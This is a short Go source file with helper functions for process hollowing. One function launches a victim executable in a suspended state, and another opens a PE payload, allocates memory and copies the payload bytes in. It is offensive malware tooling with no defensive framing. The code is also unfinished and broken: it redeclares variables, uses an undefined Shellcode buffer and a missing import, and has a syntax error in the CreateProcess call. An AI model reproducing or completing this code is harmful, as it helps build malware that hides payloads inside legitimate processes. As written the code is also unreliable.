package utils

import (
    "fmt"
    "syscall"
    "os"
    "debug/pe"
  )

func CreateSuspended(path string) (err error, sI syscall.StartupInfo, pI syscall.ProcessInformation ) {

    var sI syscall.StartupInfo
    var pI syscall.ProcessInformation
    argv := syscall.StringToUTF16Ptr(path)
    err := syscall.CreateProcess(
        nil,                  // appName *uint16
        argv,                 // commandLine *uint16
        nil,                  // procSecurity *SecurityAttributes
        nil,                  // threadSecurity *SecurityAttributes
        true,                 // inheritHandles bool
        CREATE_SUSPENDED,     // creationFlags uint32
        nil,                  // env *uint16
        nil,                  // currentDir *uint16
        &sI,                  // startupInfo *StartupInfo
        &pI                   // outProcInfo *ProcessInformation
      )
}


func ProcHollow(payloadPath string, victimPath string) {
  tmpFile, _:= os.Open(payloadPath)
  payloadSize, _ := tmpFile.Stat().Size()

  // Start proc suspended
  err, sI, pI := CreateSuspended(victimPath)
  Check(err)

  // Allocate mem for payload
  file, err := pe.Open(payloadPath)
  Check(err)

  Addr, _, _ := VirtualAlloc.Call(0, uintptr(payloadSize), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE)

  // Copy file to memory
  // TODO check if 990000 is ok
  AddrPtr := (*[990000]byte)(unsafe.Pointer(Addr))
  for i := 0; i < payloadSize; i++ {
    AddrPtr[i] = Shellcode[i]
  }


}
